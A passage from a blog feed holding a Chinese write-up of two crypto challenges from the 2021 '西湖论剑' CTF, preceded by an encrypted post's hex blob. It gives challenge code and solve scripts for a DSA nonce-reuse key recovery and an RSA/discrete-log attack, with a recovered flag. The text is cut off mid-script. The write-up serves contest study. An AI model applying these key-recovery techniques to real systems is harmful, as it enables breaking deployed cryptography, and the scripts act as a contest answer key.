69b8106fcf60b8c7f9493e1ed5d30de2223a61daf9c4dff463843b18a7218de21df219dee94a341378e55a7edcaedee40311e358bf5425b5903571b67e2e8cf69c3a4b6c303f53333adb1db15b78ed3b0c9431ba71f0f6d5930f046eb8a8ff3a9892dcd90425cd86126e2c5897aebb3b0620f185a0929aae8aab732b17f67da08bd6ee4abdcc803a5881a5067d8c15713b91dbaf493c628198d8619dde0c023516ec9963deae1c90fe71b6b4f3687d60c28436a2717ebbc8421443fab373a3cfef8cd4504dfb2e6821bfb295995402b1a63a9613fb40f2369ca8d2a90d65c6a90a3a717985fe5b6c05e875096f65a9e92e9e390eca7edfda98ddabc96002db22c276a711d979804275deb3ef6f18e4134c5ced985a0e35ad34dd701190b499592626dbbaf6ace448b74738c1bfb25a0418de5aa789e6aef8128d650df1c4811c202e2a63d22a7ff51dd2e477a3719c4047f52836ac4315b1d19d3bb65d6597777afb41a2749c853135f388ff0ff1ac6daba4e99aa2dc92c3fe8a4e159c1878e6b957f4ccf6082d5acc6e5812e86974bed49247c7e3804f3b2354fd132ea5c16be133a31a325f453790750ae2be478d9962247251466096e6e5906a4c3c62111dac49f96ee3a2d0f58a52abe59b6414d5ff90ccf73127ad519fe83497b357f5e57eb21e9ff9bdf2e050c2ae46401370d32550dc281fd60952d8320882512f740bdb03b4828e69f24122380c5cd61b4be43588a8ddb6629b5b325c6e30efc01b4495a2306365e0be9649680dcdb6b49ef5526bba2daa2a0afd89b3b7c77073b2de4bbb5fbaa7156932911d62a0bcd272694e55f7a4efd35e2009d79861f51b73bdda2ed4cb620b907698d420b6e1004708e611861a8cfc7ee8f3e48dea7bb0ec2d0aba0517229fadbe5a97de7d138a21700c2c0d7b05e6b71bdd9eba43a0d4ea2994a5f4b8e0429006694c6ea52c4bb4a281cc5ec782301565c2a306c7f648bd147af27b3b4631757d4c828e8c35d8206fd0bb2b033063433bb66f48c59be9b66a3679f522335b8ddd271304b7d4a4d4b553815700f22e5ce84d170c031b433f5562d76f65137822a51c75eeb5b963eddc53ad171746c74cdc332e3b648af6eb69edebfe22953350e265e8b8335c9b04d7d085fd79092666981bc5e779fd32a5cfbc12e2bfa712bb69f504161a3557d6d9fe2554baecf2fb7c4f41e142ddf2901d88e4649576041a445b4b9148c7a4c11a84e760e358ac2bb7f549f9e772a8868e2602c14b9923e49fd547e3f05a3a12867ace14d3b83d3cb49452408e181177a1a972921c890c7adb57deaf53aef7d344d6e15efdde8d5c15af74882b1a9302bfb0218c7872b406bbd5cdaf97fa9bb56ae7348e71888c567112a36e190996668e939240baca17d06956cce76397c3f725bf2a82144cc79194f7c05c419f185935c633522f32bc5777c26765a148067ab86cb96b3867abf92243efe3559f5a378065cf1e4fac08919d859c52630cb02285dba197cf0573d51d37de5e4082f4e4ac0dbc99dad36e9d80e67433a407b71126b3b65e08adc5a7ed8def87f270b55247075e7c0859f444db665dfc31b50275f8e6cb25ce8b79989f3c81e0ef93354ddb5c4b292462c589dadb7021c3a7440f1bdb66a289216ec157ac1542687cd078e26dffe2258b71c65312d228e956477cc0c4d25887c57493ab9cbc192e590e1f3645ad7f69d2c50b776d8bdba0f104155b566c53ed19cd53704082036cb29c274876dd2cc08f82c7356c464c135d5abe9fd2bc602c8122989f34394650cedd9bf5c60af185010e9ef1aadef49196d5f9d55e8426f7e9968434807e65e4d9915a495fa55ed9ef712dd74bab853d37da91bbf88f6f68efaf136ca3070d054bb64dfd0f78b7dadaa2ab6d3ddd3e7212f0fac6822f300ecb3445a1a3608a801991ced1ee25ad3ed20abf2c726a92272a3f1f065c9aeb47056deba79bea945f53e74c650a355348179769d0f6b93f2487866e2f0e73658853f3d8e8ae4f90d3c8605fcde46c177bf1acb29b054b05dbe3260068257027ad18fe77d7c393e636377e67530c74dd798231ea4efc9fe0c56d8a0ba42f495e72d7459c75ab6b7309fe6b1e13bc85d689995684c2dab5b21ed0adb8ecdc8224b6b0e45bb705b095ad08f88a9a2fede1c26d139b76b54bdc8a6c40f078a1a49ff01fa19223566f89ad8ada2eb15d3c076f990e239830aac82492e9381c3779771e56c650a1a561a96b1e827cb0ffc64acb264cc97d9f31aea935b161ba2c9e5924348e7a6befbba6a17df54a50110f28e0751c2738cd0490c40fc13612d26fe812c978bd4e0e743e9365a67ecfee657b60568a56a6ac290b49be05bd147688143663699dc10b068b14afbf80bb7c94ce7b2fbaa7c507ef89260079b60b025a232105b8673b4fcbe4af2448e29fec207379f69d8249c1daf40a2cfab5a96ec8d2d9801b83360172d1677967d70eb7ad8ab2309f206b3b42fbc3b86c92ad0273ba4c37772b6fd3b6b2c7f03216ab00a453889c2878fd7e3585ede251d7018ad86e3d78f6dd7ba08f3571ea3865be5ac0e56c3bdf4caf54cd462e9dec996b2fcb6e81a0011b41587025fab35543fb62031e41c97aeb005627cb38338b0c6e4f2deee8afba0a8a1f706eb555bc647853f19a08f0b1752e986c3a088b6c1c3db5526a3d0aaa0e912dacb09b0b36870d04bf855e85059e5a089049a65d4f6c69b1cc55cdbfddc2400ba1b8e2b9fd536d326600906361337134cd4d69f4d58563e58c7fb21127a1f10d210196156b218d7f34f9542a4049682a31d589ac22aa1e0622ef35d5082e7cf85f923e416bf2cf1bfee77e2bc15b783a5ae1b10c90eae41f0a96b8968b693a657f4f44c7c1972264909d40305d781a6c12048c0818653bc28688f5319aded961606330253d0f0a2110601649a9050a77eb1db2265009a9cdd688ae3abd0a0d51da405ea9a855d17a08d63fd94ef05e350029071d42a94b28ae5eae54bc29bcd6cfa602c8fc2545ffc062344caa57e4b870583850492300314536a244709a31fbe462750bcf7526b54686b929963080c3fa05a678d9ef29b6e47151a4bd62cde048f34b9b29ca3abc134925a45099a6563de0290bc611d3689aea5ed1fb3d39a093dc71caaa76cdc72588ca5dee6f9a7aff170239bde2a17f95fb38d92b87c60a8875d80bd52060bc8626692c310b98ad6a1bb913a11848af134454bad8e73a47274d9564f0fa5f7dfdfd225a5a68b39d0dd1d38ef83d531c4622e9b73e84983da2733c35e55c861e8e26508860d5d0d8dad4a9b66dabac3967fdb4cadf95855a9c3b1e47de9b754818f6a3e83f67fcd8c2180210b5ceb94c5d65259fa6bbfa7dda2695a9f1cbcc933fc396e0a31aace68b8e3186c04a98f1235b9d50702ec80ce58dfb7fbe08150106f2ce0cd289e264aac43f37709392be9dcbed3d1149e33fcd32f8b33497d527ee2d0162beb0cde539585604a9c3baf5d2227252069589b048e40098e5b391406fb81c2831b45f0dfc8ef2bd6535a5bb4fa70e0136098226979be5f2f397d59c77733e376060f3332b03f059d054dd528923f9b6eb91bbe115bc6ef28bc0c11b79c070ca3d3e05e88e622b5c6b3996b88254cc44a76292b4880e527d92d63069e2f074f5210818bf71a8d885dfa965ed4a160c06b02301ab992106ac28a6d76524967385d1183faf6f23f684ad1d86e57c9e4711c365955c855e2c3a58c49cf02668178fdbd7039e3519539e6a103325279af52f27df8610eb269785fa032ab5b1e23483359777cf1619ff9c6d68fba1665e7a483e8084085d81cda403a912ed916b114643c6b4b1eedf80c932b52757dcb4fd136fe8483f112ad9126cab24991245e8044fe78b9db6a3464808d7e7c23865edbccb505136b872e1ef57809cf7ea0f605551f99681d1cd934d179289307bd4f76bc3cc0f348280d23d632e6ebff95f7ee28071ac101b95d635f380e26423efcdc219d443b1d36ac9cef79df664411ba4b0505040958ce8e355001694c579381e78dc7f8f1433a5c0ea7473b137e84c0189693b716218053dd94bef831cbb62a37f467f6ded0aee11ffaec4ab979e226be4c47a5bbed8498509c3bff138c3f5d1f4fc15a27bf80de5b1c1e63347f9d28b98bea728e25bfa3f5c7a670133776b39933fc9da877d4e8aada16cf21a07530ba1d50197a842470c19df08a766ea15334aa34516cbd31d8c861524b4ee0a85992ce22a6daadd5a424c6571be50712c8a259fa20c6ee423d4bf695fb7a7b40dc5c86d3c0e6befe4d1c8b962bc92aaecc5b10270fcfdcfe8581a4f7746561e2527de30e86874d93a825ea1eb2475098c08068c35f0aa4167bfc6d24ee255f2ddea83a097982131839ae4c6136d086cd0bbb00d328c565297f4a1788923718c7612f1147c8849b60ffaca008c4943993b704bef98e993c969017ebc151670a8f73fe9c5f47dfc9ed7a8512c7d0b78046e2cea09afa66e4cdc7912d810fe03ac987acbf2b3a495ad593970d17f5f7df6d70a309de4bd2c2ffba74cf1530f2f0a78b4c67125820b70d18b5c57deae18e70c7f9fa0ec2f2e4a70e50cdb0b741bbe46ae7aef8abe530e31b46bb9d8b8acb36d8979d211033e928321070e11f4bd3fb1224d1d3e2cccff5489a99c2b902d662d0244702c30a714579b9d73119073b85ec8ffd1d58a3b368f4501c06cfde600c1720fede685dd1df583df049f084a979a94066d3feda8d4baba7b9639acea5c5dd3b8fbb13c0ef92c38c0f5eb84472514ad1d62821c0a08dc2bd803db0a8bc3f91258515ac9fd9b5c1f9ecf20a6770456cb83c6bfeeaddf451be838a37f5aafab3549e3096eca63f1d17aae9dc8263fa7b88cdf3abaede843a2d6007d17d38a186295f911787c8430858ceb27af1c59b038df033e862b2d279586d77eb98f82514edf2baa21d79fe7c00cf81c18fb14024941c878559056e29746a035289704976103bc4c79f2f95d408d809f84f75a6526670f57e7b3e7468b7b9af4a31a0b3eea4da912b37ebf0905e5d413f9e48c3a864063337857d035bb6affd327563bc8f72335701f98f1f92816892a3921cfa84afab128c78f9c80ed1735411e647d06384da9697e7695b43e9f43a06241dc14932caf72c6f22a65f2c47928bb4faf53e4546443d44a107d6672144c11ddc1ee0b865c5085fe08193509a1223c156fdb0c01b90cb7c8a5bc289a75d548a9ae604184eaf817102ca03d0fd007e497631bc7ee1cd4217477e90e7f72b963cb868be5a0bf2548676da7025e16eebecaa0f86f04c3509e08d3d78147ab39b743217c7f2ee6b32709fbacb8dc6028a5419505c017d2486a9c80214ba2038ad0dcf1a6812462cb9f6cf9f2da3a05ed7b930a1cc3b018bfbb90f0671ef7b8761e2f71688724c0d3b0ddec47e74edad6e43d51ca23d33d216a246d5a008d2d95dad2ef74a47704d17f9d17df95f5f04aa1f9a1d6f9958e00f17edb80a6b0d2117960d3bc310bb1c98db8582aa9d89b6d7a732481a4ff9221033ccf93102b6e63e0347233ecb3f70b0d7f0a86f9ddc83eb50eb3ff66571e8157b4e8acb432829365f0a789f6d9697973a6d4e83a126689a3408c465ca52b5a182b9cff99004882a0467c31729fd9aefa47c03997a72b60edae47cf205e0f4a35c17de80ff217e6acc6e1c4bd8b08f97902c39db1533fa7e8c8d498e28fc956ed049a82986ab408e50bd463781afb5f5c5e1f2089cbbdf1f46b038bbd00b46eb92fc1f49fa127115c128b95e53175de8c85bc86b8f62874914dc798e45dbdca1bf556887162ab94263c1d624a4fb1ecceb04ab6b75f2fada0844073ec2e69fb618bc0207438fea397f436c14638718213ff3578aa0336b51648ffbdee32204dda70df907ef9ed3bbf73d4dc8e03c6f1d2f18233ccd96b0cedeca41aaa86096b346e689b4f50313d42f8ab5ffd5a57ff4ff3e38c42b58ad2bc26feaf6ad7d6b96c452d72128c441cc85a1966448447062cfa2aa353f3fd5922d4670810cbc8d631bc51864bac2b3da5af3c801ff2cb037a25ab7e7d25b865ae6f3f65383e438d3970798b013328fe8576f8354ac422a1b1b143203e8da9c9331eba39a567db16af9db3ec4a681970942de96abe8ec12f5dc26f7befacb37a2514137a4f64a3ac4aacea49e3e4bce80fdd49c70b2cf1f3c8b1c2b438786aeee1516d02137a6ba1f1321b589be94168c1c2c66e4929962df83160bbfcfb6b10b3958bbbe68ebe2f72d44bbbbac1babbdd78d5d7311db66bb294dd9edf4042e7cdef76f4a02b31af2427d5af0208135563f835315693f703be27390518359994cf7da414a098fcafa49ba7bc082bc659cb4c562d8a2bd162e8b312b159f6e56ae7075e16941fc3487da73d43b5ad5c7e14d42f239ddce0bc9e498b57aea7b5f6108</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">You cant see it</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑</title>
    <url>/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<p>题目还不错，难度梯度有点大，出了三道，后面三道难的都不会做</p>
<p>面向WP学习</p>
<span id="more"></span>
<h1 id="unknown_dsa">unknown_dsa</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,m1,m2,ul,vl,wl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    key = DSA.generate(<span class="built_in">int</span>(<span class="number">1024</span>))</span><br><span class="line">    q = key.q</span><br><span class="line">    p = key.p</span><br><span class="line">    g = key.g</span><br><span class="line">    x1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">    x2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">assert</span> x1&lt;q <span class="keyword">and</span> x2&lt;q</span><br><span class="line">    t = powmod(g, p*q-(p+q), p*q)</span><br><span class="line">    hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">    hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line">    k = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    r1 = powmod(g, k, p) % q</span><br><span class="line">    s1 = (hm1 + x1*r1) * invert(k, q) % q</span><br><span class="line">    s2 = (hm2 + x1*r1) * invert(k, q) % q</span><br><span class="line">    r2 = powmod(g, x1, p) % q</span><br><span class="line">    s3 = (hm1 + x2*r2) * invert(k, q) % q</span><br><span class="line">    <span class="built_in">print</span>(p*q, (p-<span class="number">1</span>)//q, t, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r1, s1, s2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2, s3, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ul)):</span><br><span class="line">        <span class="keyword">assert</span> ul[i]**<span class="number">2</span> - wl[i]* vl[i]**<span class="number">2</span>==<span class="number">1</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    cl1 = [<span class="built_in">int</span>(powmod(bytes_to_long(m1), e, x)) <span class="keyword">for</span> x <span class="keyword">in</span> ul]</span><br><span class="line">    cl2 = [<span class="built_in">int</span>(powmod(bytes_to_long(m2), e, y)) <span class="keyword">for</span> y <span class="keyword">in</span> vl]</span><br><span class="line">    <span class="built_in">print</span>(wl, cl1, cl2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    encrypt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[3912956711, 4013184893, 3260747771], [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424], [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]</span></span><br><span class="line"><span class="string">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line"><span class="string">498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243</span></span><br><span class="line"><span class="string">620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>dsa部分是最基本的形式，就差H(m1)和H(m2)</p>
<p>m1和m2经过三次RSA加密，但模数未知</p>
<p>模数由佩尔方程解出，再用低指数广播可拿到m^7，开根即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n,k,t = <span class="number">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span>, <span class="number">106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span>, <span class="number">60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line">wl, cl1, cl2 =[<span class="number">3912956711</span>, <span class="number">4013184893</span>, <span class="number">3260747771</span>], [<span class="number">2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704</span>, <span class="number">21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961</span>, <span class="number">301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424</span>], [<span class="number">148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144</span>, <span class="number">1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256</span>, <span class="number">10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842</span>]</span><br><span class="line"></span><br><span class="line">q = <span class="number">895513916279543445314258868563331268261201605181</span></span><br><span class="line">p = k*q + <span class="number">1</span></span><br><span class="line">g = <span class="number">8065494126227608731057119338486910291529176576096612311734285061607284964658737003594964324046804258074712614189778906098614765392123515385260406254416427321997510822217750260108595410657401</span></span><br><span class="line"></span><br><span class="line">r1, s1, s2  = <span class="number">498841194617327650445431051685964174399227739376</span>, <span class="number">376599166921876118994132185660203151983500670896</span>, <span class="number">187705159843973102963593151204361139335048329243</span></span><br><span class="line">r2, s3 = <span class="number">620827881415493136309071302986914844220776856282</span>, <span class="number">674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line"></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">ul = []</span><br><span class="line">vl = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wl)):</span><br><span class="line">    uli,vli = solve_pell(wl[i])</span><br><span class="line">    ul.append(uli)</span><br><span class="line">    vl.append(vli)</span><br><span class="line">    <span class="built_in">print</span>(uli**<span class="number">2</span> - wl[i]* vli**<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">m1 = crt(cl1,ul)</span><br><span class="line">m2 = crt(cl2,vl)</span><br><span class="line">m1 = iroot(m1,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m2 = iroot(m2,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line">m2 = long_to_bytes(m2)</span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">k = (hm1-hm2) * invert(s1-s2,q) % q</span><br><span class="line">x = (s1*k-hm1) * invert(r1,q) %q</span><br><span class="line">x1 = long_to_bytes(x)</span><br><span class="line"></span><br><span class="line">x2 = (s3*k-hm1) * invert(r2,q) %q</span><br><span class="line">x2 = long_to_bytes(x2)</span><br><span class="line"><span class="built_in">print</span>(x1+x2)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;f11bad18f529750fe52c56eed85d001b&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="hardrsa">hardrsa</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = gmpy2.lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dp = &quot;</span> + <span class="built_in">str</span>(dp))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(g, x, y)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;c1 = &quot;</span> + <span class="built_in">str</span>(c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br></pre></td></tr></table></figure>
<p>y-1光滑，可用离散对数解出x，然后Z3
Solver解出p，接着就是已知dp，p的模型，很容易就能做出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">c1 = <span 